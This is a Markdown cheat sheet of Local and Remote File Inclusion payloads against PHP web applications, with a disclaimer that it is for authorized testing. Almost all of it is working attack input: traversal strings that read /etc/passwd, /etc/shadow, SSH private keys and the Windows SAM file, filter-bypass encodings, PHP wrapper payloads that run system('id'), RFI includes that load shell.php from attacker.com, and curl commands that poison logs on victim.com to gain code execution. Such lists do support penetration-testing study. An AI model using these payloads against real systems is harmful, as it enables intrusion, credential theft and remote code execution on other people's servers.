# LFI and RFI Payload Cheat Sheet

This cheat sheet contains a detailed list of Local File Inclusion (LFI) and Remote File Inclusion (RFI) payloads for testing and exploiting file inclusion vulnerabilities. **Note:** These payloads are intended for educational and authorized testing purposes only.

---

## Contents

- [Basic LFI Payloads](#basic-lfi-payloads)
- [Directory Traversal LFI Payloads](#directory-traversal-lfi-payloads)
- [LFI with Null Byte Injection](#lfi-with-null-byte-injection)
- [PHP Wrappers for LFI](#php-wrappers-for-lfi)
- [RFI Payloads](#rfi-payloads)
- [Bypassing Filters for LFI/RFI](#bypassing-filters-for-lfirfi)
- [LFI to RCE (Remote Code Execution)](#lfi-to-rce-remote-code-execution)
- [Advanced LFI Techniques](#advanced-lfi-techniques)

---

## Basic LFI Payloads

Basic LFI payloads leverage direct access to system files or application files through vulnerable parameters.

```php
?page=/etc/passwd
?page=../../../../../etc/passwd
?page=/proc/self/environ
?page=/var/log/apache2/access.log
?page=C:\Windows\System32\drivers\etc\hosts
```

---

## Directory Traversal LFI Payloads

Traversing directories is essential for accessing files outside the web root.

```php
?page=../../../../etc/passwd
?page=../../../../etc/issue
?page=../../../../var/log/auth.log
?page=../../../../proc/self/status
?page=../../../../proc/self/cmdline
```

### Common Files to Target

- **Unix-based**: `/etc/passwd`, `/etc/shadow`, `/proc/self/environ`, `/var/log/apache2/access.log`
- **Windows-based**: `C:\Windows\win.ini`, `C:\Windows\System32\config\SAM`, `C:\Windows\System32\drivers\etc\hosts`

---

## LFI with Null Byte Injection

Some applications can be tricked into reading files by injecting a null byte (`%00`) to bypass file extension checks.

```php
?page=/etc/passwd%00
?page=../../../../etc/issue%00
?page=../../../../proc/self/environ%00
?page=../../../../var/log/auth.log%00
```

> **Note**: Null byte injection may only work in PHP versions prior to 5.3.4 due to security improvements.

---

## PHP Wrappers for LFI

PHP wrappers enable LFI to access files with alternative encodings, streams, and methods.

### PHP Filter Wrappers

```php
?page=php://filter/convert.base64-encode/resource=index.php
?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
```

### PHP Data Wrapper

Embedding malicious PHP code directly with `data://` can lead to remote code execution if file includes aren’t properly sanitized.

```php
?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==  // Base64-encoded "<?php phpinfo(); ?>"
```

### PHP Expect Wrapper (If enabled)

```php
?page=expect://ls
```

### PHP Input Wrapper

The `php://input` wrapper allows reading raw POST data, which is useful for injecting PHP code if the input is included.

```php
POST /index.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

---

## RFI Payloads

Remote File Inclusion (RFI) exploits allow external files to be included, potentially executing attacker-controlled code.

```php
?page=http://attacker.com/malicious.txt
?page=https://attacker.com/shell.php
?page=ftp://attacker.com/payload.txt
```

> **Note**: Modern PHP settings often disable `allow_url_include` by default, which prevents direct RFI attacks.

---

## Bypassing Filters for LFI/RFI

Bypassing filters can be essential in situations where direct file paths are blocked.

### Encoding

Using URL encoding can bypass certain filters.

```php
?page=..%2f..%2f..%2f..%2fetc%2fpasswd
?page=../../../../../../../../etc/passwd%2500
```

### Wrapping Directory Traversals

Attempting to obfuscate by interleaving traversal sequences.

```php
?page=....//....//....//etc/passwd
?page=....//....//....//proc/self/environ
```

### Double Encoding

Using double URL encoding can sometimes bypass restrictive filters.

```php
?page=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

---

## LFI to RCE (Remote Code Execution)

Some LFI vulnerabilities can be escalated to remote code execution if the attacker can write to log files or other files that are included by the application.

### Exploiting Log Files

If you can inject PHP code into server logs, you may be able to achieve RCE by including these files.

1. Inject payload into a log file:

    ```bash
    curl "http://victim.com/index.php?page=/var/log/apache2/access.log" -A "<?php system('id'); ?>"
    ```

2. Access the log file via LFI:

    ```php
    ?page=/var/log/apache2/access.log
    ```

### Exploiting `/proc/self/environ`

Some environments store environment variables in `/proc/self/environ`, allowing code execution if the user-agent or other variables can be injected.

```bash
curl -A "<?php system('id'); ?>" "http://victim.com/index.php?page=/proc/self/environ"
```

---

## Advanced LFI Techniques

Advanced LFI techniques target specific files and include methods to manipulate them for greater exploit potential.

### Using SSH and FTP Configuration Files

In cases where LFI is possible, attempting to read SSH or FTP config files may reveal sensitive credentials.

```php
?page=../../../../../../.ssh/id_rsa
?page=../../../../../../etc/ssh/sshd_config
```

### Using `/proc/self/fd`

On Linux, `/proc/self/fd/` can be used to read file descriptors of running processes, which may expose additional files.

```php
?page=/proc/self/fd/0
?page=/proc/self/fd/1
?page=/proc/self/fd/2
```

### Base64 Encoding PHP Code for Data URIs

Encoding PHP code with Base64 for `data://` wrappers allows executing code directly.

```php
?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg== // "<?php system('id'); ?>"
```

---

## Additional Notes

- **File Encoding**: In cases where files are unreadable, try using `php://filter` to convert them into readable formats.
- **RFI and Firewalls**: RFI is often blocked by firewalls, but sometimes bypasses are possible using alternate protocols or tunneling techniques.
- **Common PHP Wrappers**: Wrappers like `php://input`, `php://filter`, and `data://` are highly useful in LFI/RFI testing.
  
---

### License

This cheat sheet is open-sourced and can be used for ethical testing and research. Unauthorized or illegal testing is prohibited.

---
